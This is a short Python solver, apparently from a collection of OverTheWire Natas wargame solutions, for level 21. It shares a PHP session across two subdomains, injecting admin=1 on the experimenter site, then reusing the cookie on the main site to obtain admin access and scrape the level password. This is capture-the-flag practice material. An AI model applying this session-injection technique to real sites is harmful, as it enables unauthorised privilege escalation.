import re
from src.natas.base_level import NatasLevel

class Level_21(NatasLevel):

  num = 21
  explanation = "On this level, two subdomains share sessions. We set `admin=1` on the experimenter subdomain,\n     then reuse the same `PHPSESSID` on the main site to gain admin privileges."

  def exploit(self) -> str:

    url_exp = "http://natas21-experimenter.natas.labs.overthewire.org"

    self.session.post(url_exp)
    cookie = self.session.cookies.get("PHPSESSID")
    self.session.post(url_exp + "/index.php", data={"submit": "1", "admin": "1"})
    resp   = self.session.get(self.base_url + "/index.php", headers = {'Cookie': f"PHPSESSID={cookie}"})
    match  = re.search(r'Password: (.*)', resp.text, re.MULTILINE).group().replace("Password:", "").replace("</pre>", "").strip()
    return match
